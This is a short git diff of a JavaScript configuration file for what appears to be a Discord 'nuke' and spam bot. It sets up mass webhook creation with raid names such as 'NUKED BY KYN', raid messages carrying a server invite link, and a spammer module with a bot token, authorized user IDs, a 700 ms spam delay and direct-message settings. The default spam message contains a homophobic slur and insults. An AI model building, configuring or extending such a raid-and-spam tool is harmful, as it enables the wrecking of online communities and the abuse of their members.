@@ -51,7 +51,7 @@ module.exports = {
         },
         webhooks: {
             createCount: 2,
-            names: ["NUKED BY KYN", "GET WRECKED"],
+            names: ["NUKED BY KYN", "GET WRECKED BY GOLDSOCIETY"],
             messages: ["# NUKEDDDDDDDD JOIN https://discord.gg/zxstXnd4", "# KYN OWNS YOU"]
         },
         roles: {
@@ -65,8 +65,8 @@ module.exports = {
 
     spammer: {
         token: process.env.TOKEN_SPAMMER,
-        authorizedIds: ['1284886248330231891', '1340617218542800916', '1360301293872091136'],
-        whitelistedIds: ['1284886248330231891', '123'],
+        authorizedIds: ['1284886248330231891', '13', '13'],
+        whitelistedIds: ['1284886248330231891', '12'],
         defaultSpamMessage: "# YOU'RE BEING SPAMMED BY KYN FAGT! GET LOST BOZO! https://cdn.discordapp.com/attachments/1243645226091020328/1320136219585155114/d68845f804446649d52eb4085678eb3c.gif",
         spamDelay: 700,
         dm: {
